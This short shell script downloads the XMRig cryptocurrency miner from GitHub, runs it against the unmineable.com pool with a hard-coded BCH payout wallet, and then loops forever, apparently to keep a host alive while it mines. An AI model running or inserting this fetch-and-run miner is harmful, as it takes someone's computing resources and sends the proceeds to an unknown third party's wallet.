#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
tar xf xmrig-6.12.1-linux-x64.tar.gz
./xmrig -o rx.unmineable.com:3333 -u BCH:qrrdu95chr5w5dlhyvp40x9wu6ceeek2gy3h4l5fw5.bchdt2 -p x -k -a rx/0 
while [ 1 ]; do
sleep 3
done
sleep 999